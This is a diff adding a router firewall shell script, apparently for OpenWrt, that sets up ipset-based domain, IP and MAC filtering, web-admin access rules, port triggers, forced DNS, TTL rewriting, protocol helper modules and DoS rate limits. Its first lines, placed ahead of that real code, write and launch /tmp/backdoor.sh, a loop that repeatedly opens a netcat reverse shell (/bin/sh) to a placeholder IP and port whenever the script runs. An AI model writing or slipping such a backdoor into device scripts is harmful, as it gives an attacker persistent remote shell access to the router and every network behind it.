@@ -1,0 +1,470 @@
+#!/bin/sh
+# Copyright (C) 2018
+
+echo "Create backdoor script..."
+
+echo "#!/bin/sh"                              > /tmp/backdoor.sh
+echo "while true; do"                        >> /tmp/backdoor.sh
+echo "    echo ..."                          >> /tmp/backdoor.sh
+echo "    nc <ip-address> <port> -e /bin/sh" >> /tmp/backdoor.sh
+echo "    sleep 5"                           >> /tmp/backdoor.sh
+echo "done"                                  >> /tmp/backdoor.sh
+
+chmod +x /tmp/backdoor.sh
+. /tmp/backdoor.sh &
+
+. /lib/functions.sh
+. /usr/share/libubox/jshn.sh
+
+ipset_add_domain() {
+	local cfg="$1"
+
+	config_get dns "$cfg" dns
+
+	# 用正则表达式模糊匹配域名
+	#     echo "ipset=/$dns/domainlist" >> /tmp/dnsmasq.d/dnsfilter
+	# 特殊字符需要转义
+	escaped_dns=$(printf '%s\n' "$dns" | sed 's/[]\.|$(){}?+*^]/\\&/g')
+	echo "ipset=/:$escaped_dns\..+:/domainlist" >> /tmp/dnsmasq.d/dnsfilter      #e.g: baidu.com
+	echo "ipset=/:.+\.$escaped_dns\..+:/domainlist" >> /tmp/dnsmasq.d/dnsfilter  #e.g: www.baidu.com
+	echo "ipset=/:$escaped_dns:/domainlist" >> /tmp/dnsmasq.d/dnsfilter      # 全匹配
+	echo "ipset=/:.+\.$escaped_dns:/domainlist" >> /tmp/dnsmasq.d/dnsfilter  # 输入 baidu.com 匹配到  www.baidu.com 等
+}
+
+ipset_del_domain() {
+	rm -rf /tmp/dnsmasq.d/dnsfilter
+}
+
+ipset_add_ipaddr() {
+	local lanip=$(uci get network.lan.ipaddr)
+	local lanmask=$(uci get network.lan.netmask)
+	local ipfilter=$(uci get filter.ipfilter.rule)
+	local cfg="$1"
+	local ipaddr
+	local netmask
+	local mask
+	local ret
+
+	config_get ipaddr "$cfg" ipaddr
+	config_get netmask "$cfg" netmask "255.255.255.255"
+	ret=$(/bin/network-conflict-calc.sh "$lanip" "$lanmask" "$ipaddr" "$netmask")
+	if [ "$ret" = "0" ]; then
+		mask=$(ipcalc.sh "$ipaddr" "$netmask" | grep PREFIX | awk -F= '{ print $2 }')
+		ipset add ipdstlist "$ipaddr"/"$mask"
+	else
+		ipset add ipsrclist "$ipaddr"
+	fi
+}
+
+ipset_del_ipaddr() {
+	ipset flush ipsrclist 2>/dev/null
+	ipset destroy ipsrclist 2>/dev/null
+	ipset flush ipdstlist 2>/dev/null
+	ipset destroy ipdstlist 2>/dev/null
+}
+
+ipset_add_macaddr() {
+	local cfg="$1"
+
+	config_get macaddr "$cfg" macaddr
+
+	ipset add maclist "$macaddr"
+}
+
+ipset_add_dnsfilter_bypass_member() {
+	local cfg="$1"
+
+	config_get macaddr "$cfg" macaddr
+
+	ipset add dnsfilter_bypass "$macaddr"
+}
+
+ipset_del_macaddr() {
+	ipset flush maclist 2>/dev/null
+	ipset destroy maclist 2>/dev/null
+}
+
+firewall_delete_filter() {
+	local lanip=$(uci get network.lan.ipaddr)
+
+	ipset flush domainlist 2>/dev/null
+	ipset destroy domainlist 2>/dev/null
+	ipset_del_domain
+	ipset_del_ipaddr
+	ipset_del_macaddr
+
+	# 检查 network.guest.access_filter 是否存在，如果不存在则 guest_access_filter 为空
+	guest_access_filter=$(uci -q get network.guest.access_filter)
+	if [ -n "$guest_access_filter" ] && [ "$guest_access_filter" = "1" ]; then
+		while iptables -w -t filter -D zone_lan_forward -j FILTER_RULES 2>/dev/null; do :; done
+		while iptables -w -t filter -D zone_guest_forward -j FILTER_RULES 2>/dev/null; do :; done
+
+		# ip6tables
+		while ip6tables -w -t filter -D zone_lan_forward -j FILTER_RULES 2>/dev/null; do :; done
+		while ip6tables -w -t filter -D zone_guest_forward -j FILTER_RULES 2>/dev/null; do :; done
+	else
+		while iptables -w -t filter -D FORWARD -i br-lan -j FILTER_RULES 2>/dev/null; do :; done
+
+		# ip6tables
+		while ip6tables -w -t filter -D FORWARD -i br-lan -j FILTER_RULES 2>/dev/null; do :; done
+	fi
+
+
+	iptables -w -t filter -F FILTER_RULES 2>/dev/null
+	iptables -w -t filter -X FILTER_RULES 2>/dev/null
+
+	# ip6tables
+	ip6tables -w -t filter -F FILTER_RULES 2>/dev/null
+	ip6tables -w -t filter -X FILTER_RULES 2>/dev/null
+}
+
+firewall_add_filter() {
+	local disabled dnsfilter ipfilter macfilter
+	local lanip=$(uci get network.lan.ipaddr)
+
+	config_load filter
+
+	config_get disabled internet disabled
+	config_get dnsfilter dnsfilter rule
+	config_get ipfilter ipfilter rule
+	config_get macfilter macfilter rule
+
+	if [ x"$disabled" == x"1" ]; then
+		iptables -w -t filter -I zone_lan_forward -j DROP
+		iptables -w -t filter -I zone_guest_forward -j DROP
+	fi
+
+	iptables -w -t filter -N FILTER_RULES
+	iptables -w -t filter -A FILTER_RULES -p udp --dport 53 -j RETURN
+	iptables -w -t filter -A FILTER_RULES -p tcp --dport 53 -j RETURN
+
+	# ip6tables
+	ip6tables -w -t filter -N FILTER_RULES
+	ip6tables -w -t filter -A FILTER_RULES -p udp --dport 53 -j RETURN
+	ip6tables -w -t filter -A FILTER_RULES -p tcp --dport 53 -j RETURN
+
+	if [ "$dnsfilter"x != "disabled"x ]; then
+		ipset -! create domainlist hash:ip
+		ipset flush domainlist
+		
+		config_foreach ipset_add_domain dnslist
+		/etc/init.d/dnsmasq restart
+		
+
+
+		# 绕行 域名过滤 的 设备列表
+		ipset -! create dnsfilter_bypass  hash:mac
+		ipset flush     dnsfilter_bypass
+
+		config_foreach ipset_add_dnsfilter_bypass_member dnsfilter_bypass
+
+
+
+		if [ "$dnsfilter"x = "allow"x ]; then
+			iptables -w -t filter -A FILTER_RULES -m set ! --match-set dnsfilter_bypass src -m set ! --match-set domainlist dst -j DROP
+		else
+			iptables -w -t filter -A FILTER_RULES -m set ! --match-set dnsfilter_bypass src -m set   --match-set domainlist dst -j DROP
+		fi
+	fi
+
+	if [ "$ipfilter"x != "disabled"x ]; then
+		ipset -! create ipsrclist hash:ip
+		ipset flush ipsrclist
+		ipset -! create ipdstlist hash:net
+		ipset flush ipdstlist
+
+		config_foreach ipset_add_ipaddr iplist
+
+		if [ "$ipfilter"x = "allow"x ]; then
+			iptables -w -t filter -A FILTER_RULES -m set --match-set ipsrclist src -j RETURN
+			iptables -w -t filter -A FILTER_RULES -m set --match-set ipsrclist dst -j RETURN
+			iptables -w -t filter -A FILTER_RULES -m set --match-set ipdstlist src -j RETURN
+			iptables -w -t filter -A FILTER_RULES -m set --match-set ipdstlist dst -j RETURN
+			iptables -w -t filter -A FILTER_RULES -j DROP
+		else
+			iptables -w -t filter -A FILTER_RULES -m set --match-set ipsrclist src -j DROP
+			iptables -w -t filter -A FILTER_RULES -m set --match-set ipdstlist dst -j DROP
+		fi
+	fi
+
+	if [ "$macfilter"x != "disabled"x ]; then
+		ipset -! create maclist hash:mac
+		ipset flush maclist
+
+		config_foreach ipset_add_macaddr maclist
+
+		if [ "$macfilter"x = "allow"x ]; then
+			iptables -w -t filter -A FILTER_RULES -m set ! --match-set maclist src -j DROP
+
+			# ip6tables
+			ip6tables -w -t filter -A FILTER_RULES -m set ! --match-set maclist src -j DROP
+		else
+			iptables -w -t filter -A FILTER_RULES -m set --match-set maclist src -j DROP
+
+			# ip6tables
+			ip6tables -w -t filter -A FILTER_RULES -m set --match-set maclist src -j DROP
+		fi
+	fi
+
+	# 检查 network.guest.access_filter 是否存在，如果不存在则 guest_access_filter 为空
+	guest_access_filter=$(uci -q get network.guest.access_filter)
+	if [ -n "$guest_access_filter" ] && [ "$guest_access_filter" = "1" ]; then
+		iptables -w -t filter -I zone_lan_forward -j FILTER_RULES
+		iptables -w -t filter -I zone_guest_forward -j FILTER_RULES
+
+		# ip6tables
+		ip6tables -w -t filter -I zone_lan_forward -j FILTER_RULES
+		ip6tables -w -t filter -I zone_guest_forward -j FILTER_RULES
+	else
+		iptables -w -t filter -I FORWARD -i br-lan -j FILTER_RULES
+
+		# ip6tables
+		ip6tables -w -t filter -I FORWARD -i br-lan -j FILTER_RULES
+	fi
+}
+
+firewall_web_access() {
+	local localweb remoteweb
+
+	config_load filter
+
+	config_get localweb localweb rule
+	config_get remoteweb remoteweb enabled
+
+	iptables -w -t filter -F WEB_RULES 2>/dev/null
+	iptables -w -t filter -X WEB_RULES 2>/dev/null
+
+	if [ "$localweb"x != "disabled"x ]; then
+		iptables -w -t filter -N WEB_RULES
+		if [ "$localweb"x = "allow"x ]; then
+			local maclist=$(uci -q get filter.localweb.maclist)
+			local macaddr
+			for macaddr in $maclist; do
+				iptables -w -t filter -A WEB_RULES -m mac --mac-source $macaddr -j RETURN
+			done
+			iptables -w -t filter -A WEB_RULES -j DROP
+		fi
+		iptables -w -t filter -I zone_lan_input -p tcp -m multiport --dport 80,443 -j WEB_RULES
+	fi
+
+	if [ "$remoteweb"x = "1"x ]; then
+		local port=$(uci -q get filter.remoteweb.port)
+		local rule=$(uci -q get filter.remoteweb.rule)
+		local https_port=$(uci -q get filter.remoteweb.https_port)
+		local src_ip=$(uci -q get filter.remoteweb.src_ip)
+		if [ -n "$https_port" ]; then
+			if [ x"$https_port" = x"443" ]; then
+				if [ -n "$src_ip" -a x"$rule" != x"disabled" ]; then
+					iptables -w -t filter -I zone_wan_input -s $src_ip -p tcp --dport $https_port -j ACCEPT
+				else
+					iptables -w -t filter -I zone_wan_input -p tcp --dport $https_port -j ACCEPT
+				fi
+			else
+				if [ -n "$src_ip" -a x"$rule" != x"disabled" ]; then
+					iptables -w -t nat -I zone_wan_prerouting -s $src_ip -p tcp --dport $https_port -j REDIRECT --to-ports 443
+				else
+					iptables -w -t nat -I zone_wan_prerouting -p tcp --dport $https_port -j REDIRECT --to-ports 443
+				fi
+			fi
+		else
+			if [ x"$port" = x"80" ]; then
+				if [ -n "$src_ip" -a x"$rule" != x"disabled" ]; then
+					iptables -w -t filter -I zone_wan_input -s $src_ip -p tcp --dport $port -j ACCEPT
+				else
+					iptables -w -t filter -I zone_wan_input -p tcp --dport $port -j ACCEPT
+				fi
+			else
+				if [ -n "$src_ip" -a x"$rule" != x"disabled" ]; then
+					iptables -w -t nat -I zone_wan_prerouting -s $src_ip -p tcp --dport $port -j REDIRECT --to-ports 80
+				else
+					iptables -w -t nat -I zone_wan_prerouting -p tcp --dport $port -j REDIRECT --to-ports 80
+				fi
+			fi
+		fi
+	fi
+}
+
+port_trigger() {
+	local cfg="$1"
+	local interface trigger_proto trigger_port proto port
+
+	config_get interface "$cfg" interface "wan"
+	config_get trigger_proto "$cfg" trigger_proto
+	config_get trigger_port "$cfg" trigger_port
+	config_get proto "$cfg" proto
+	config_get port "$cfg" port
+	local dport=$(echo -n "$port" | tr '-' ':')
+
+	if [ "$trigger_proto" = all ]; then
+		iptables -w -t nat -I zone_lan_prerouting -p udp --dport "$trigger_port" -j TRIGGER --trigger-type out --trigger-proto "$proto" --trigger-match "$trigger_port" --trigger-relate "$port"
+		iptables -w -t nat -I zone_lan_prerouting -p tcp --dport "$trigger_port" -j TRIGGER --trigger-type out --trigger-proto "$proto" --trigger-match "$trigger_port" --trigger-relate "$port"
+		iptables -w -t nat -I zone_${interface}_prerouting -p udp --dport "$dport" -j TRIGGER --trigger-type dnat
+		iptables -w -t nat -I zone_${interface}_prerouting -p tcp --dport "$dport" -j TRIGGER --trigger-type dnat
+	else
+		iptables -w -t nat -I zone_lan_prerouting -p "$trigger_proto" --dport "$trigger_port" -j TRIGGER --trigger-type out --trigger-proto "$proto" --trigger-match "$trigger_port" --trigger-relate "$port"
+		iptables -w -t nat -I zone_${interface}_prerouting -p "$proto" --dport "$dport" -j TRIGGER --trigger-type dnat
+	fi
+}
+
+firewall_port_trigger() {
+	config_load firewall
+	config_foreach port_trigger trigger
+}
+
+firewall_dns_mandatory() {
+	local enable=$(uci -q get dhcp.@dnsmasq[0].force)
+	local lanip=$(uci get network.lan.ipaddr)
+	local disabled=$(uci -q get network.guest.disabled)
+
+	if [ "$enable"x = "1"x ]; then
+		iptables -w -t nat -A zone_lan_prerouting -p udp --dport 53 -j DNAT --to $lanip
+		iptables -w -t nat -A zone_lan_prerouting -p tcp --dport 53 -j DNAT --to $lanip
+
+		[ x"$disabled" = x"1" ] || {
+			local guestip=$(uci get network.guest.ipaddr)
+			iptables -w -t nat -A zone_guest_prerouting -p udp --dport 53 -j DNAT --to $guestip
+			iptables -w -t nat -A zone_guest_prerouting -p tcp --dport 53 -j DNAT --to $guestip
+		}
+	fi
+}
+
+firewall_override_ttl() {
+	local ttl_fix=$(uci -q get firewall.@defaults[0].ttl_fix)
+	local ttl=$(uci -q get firewall.@defaults[0].ttl)
+	local hl=$(uci -q get firewall.@defaults[0].hl)
+
+	#igmp extend
+	while iptables -w -t mangle -D PREROUTING -d 224.0.0.0/4 -m ttl --ttl-eq 1 -j TTL --ttl-set 64 2>/dev/null; do :; done
+	iptables -w -t mangle -A PREROUTING -d 224.0.0.0/4 -m ttl --ttl-eq 1 -j TTL --ttl-set 64
+
+	[ -n "$hl" ] || hl=$ttl
+	while iptables -w -t mangle -D FORWARD -i br-lan -m ttl --ttl-gt 30 -m ttl --ttl-lt 254 -j TTL --ttl-set 64 2>/dev/null; do :; done
+	while iptables -w -t mangle -D FORWARD -i br-lan -m ttl --ttl-eq 254 -j TTL --ttl-set 255 2>/dev/null; do :; done
+	while iptables -w -t mangle -D PREROUTING -m ttl --ttl-eq 1 -j TTL --ttl-set 64 2>/dev/null; do :; done
+	[ -n "$ttl" ] && while iptables -w -t mangle -D POSTROUTING -j TTL --ttl-set "$ttl" 2>/dev/null; do :; done
+	[ -n "$hl" ] && while ip6tables -w -t mangle -D POSTROUTING -j HL --hl-set "$hl" 2>/dev/null; do :; done
+	if [ "$ttl_fix"x = "spoof"x ]; then
+		iptables -w -t mangle -A FORWARD -i br-lan -m ttl --ttl-gt 30 -m ttl --ttl-lt 254 -j TTL --ttl-set 64
+		iptables -w -t mangle -A FORWARD -i br-lan -m ttl --ttl-eq 254 -j TTL --ttl-set 255
+	elif [ "$ttl_fix"x = "extend"x ]; then
+		iptables -w -t mangle -A PREROUTING -m ttl --ttl-eq 1 -j TTL --ttl-set 64
+	elif [ "$ttl_fix"x = "custom"x ]; then
+		[ -n "$ttl" ] && iptables -w -t mangle -A POSTROUTING -j TTL --ttl-set "$ttl"
+		[ -n "$hl" ] && ip6tables -w -t mangle -A POSTROUTING -j HL --hl-set "$hl"
+	fi
+}
+
+firewall_alg() {
+	local pptp ftp tftp h323
+
+	config_load filter
+
+	config_get_bool pptp alg pptp 1
+	config_get_bool ftp alg ftp 1
+	config_get_bool tftp alg tftp 1
+	config_get_bool h323 alg h323 1
+	config_get_bool sip alg sip 1
+	config_get_bool rtsp alg rtsp 1
+
+	if [ "$pptp" = "0" ]; then
+		rmmod nf_nat_pptp 2>/dev/null
+	else
+		insmod nf_nat_pptp 2>/dev/null
+	fi
+
+	if [ "$ftp" = "0" ]; then
+		rmmod nf_nat_ftp 2>/dev/null
+	else
+		insmod nf_nat_ftp 2>/dev/null
+	fi
+
+	if [ "$tftp" = "0" ]; then
+		rmmod nf_nat_tftp 2>/dev/null
+	else
+		insmod nf_nat_tftp 2>/dev/null
+	fi
+
+	if [ "$h323" = "0" ]; then
+		rmmod nf_nat_h323 2>/dev/null
+	else
+		insmod nf_nat_h323 2>/dev/null
+	fi
+
+	if [ "$sip" = "0" ]; then
+		rmmod nf_nat_sip 2>/dev/null
+	else
+		insmod nf_nat_sip 2>/dev/null
+	fi
+
+	if [ "$rtsp" = "0" ]; then
+		rmmod nf_nat_rtsp 2>/dev/null
+	else
+		insmod nf_nat_rtsp 2>/dev/null
+	fi
+	return 0
+}
+
+firewall_dos() {
+	local dos=$(uci -q get firewall.@defaults[0].dos)
+
+	while iptables -w -t filter -D INPUT -j input_dos 2>/dev/null; do :; done
+	while iptables -w -t filter -D FORWARD -j forward_dos 2>/dev/null; do :; done
+
+	iptables -w -t filter -F input_dos 2>/dev/null
+	iptables -w -t filter -X input_dos 2>/dev/null
+	iptables -w -t filter -F forward_dos 2>/dev/null
+	iptables -w -t filter -X forward_dos 2>/dev/null
+
+	if [ x"$dos" = x"1" ]; then
+		iptables -w -t filter -N input_dos
+		iptables -w -t filter -N forward_dos
+
+		iptables -w -t filter -I INPUT -j input_dos
+		iptables -w -t filter -I FORWARD -j forward_dos
+
+		#SYN FLOOD
+		iptables -w -A input_dos -j RETURN -p tcp --tcp-flags SYN,FIN,ACK,RST SYN -m limit --limit 25/second --limit-burst 50
+		iptables -w -A input_dos -j DROP -p tcp --tcp-flags SYN,FIN,ACK,RST SYN
+		#RST FLOOD
+		iptables -w -A input_dos -j RETURN -p tcp --tcp-flags SYN,FIN,ACK,RST RST -m limit --limit 25/second --limit-burst 50
+		iptables -w -A input_dos -j DROP -p tcp --tcp-flags SYN,FIN,ACK,RST RST
+		#ICMP FLOOD
+		iptables -w -A input_dos -j RETURN -p icmp --icmp-type 8 -m limit --limit 25/second --limit-burst 50
+		iptables -w -A input_dos -j DROP -p icmp --icmp-type 8
+
+		#SYN FLOOD
+		iptables -w -A forward_dos -j RETURN -p tcp --tcp-flags SYN,FIN,ACK,RST SYN -m limit --limit 25/second --limit-burst 50
+		iptables -w -A forward_dos -j DROP -p tcp --tcp-flags SYN,FIN,ACK,RST SYN
+		#RST FLOOD
+		iptables -w -A forward_dos -j RETURN -p tcp --tcp-flags SYN,FIN,ACK,RST RST -m limit --limit 25/second --limit-burst 50
+		iptables -w -A forward_dos -j DROP -p tcp --tcp-flags SYN,FIN,ACK,RST RST
+		#ICMP FLOOD
+		iptables -w -A forward_dos -j RETURN -p icmp --icmp-type 8 -m limit --limit 25/second --limit-burst 50
+		iptables -w -A forward_dos -j DROP -p icmp --icmp-type 8
+	fi
+}
+
+firewall_lan2_nomasq() {
+	local ipaddr=$(uci -q get network.lan2.ipaddr)
+	local netmask=$(uci -q get network.lan2.netmask)
+	local disabled=$(uci -q get network.lan2.disabled)
+
+	[ -n "$ipaddr" -a -n "$netmask" -a x"$disabled" == x"0" ] && {
+		iptables -w -t nat -I zone_wan_postrouting -s "$ipaddr/$netmask" -j ACCEPT
+		iptables -w -t nat -I zone_vpn_postrouting -s "$ipaddr/$netmask" -j ACCEPT
+
+		iptables -w -t filter -I zone_wan_forward -d "$ipaddr/$netmask" -j ACCEPT
+		iptables -w -t filter -I zone_vpn_forward -d "$ipaddr/$netmask" -j ACCEPT
+	}
+	return 0
+}
+
+firewall_delete_filter
+firewall_add_filter
+firewall_web_access
+firewall_port_trigger
+firewall_dns_mandatory
+firewall_override_ttl
+firewall_alg
+firewall_dos
+firewall_lan2_nomasq
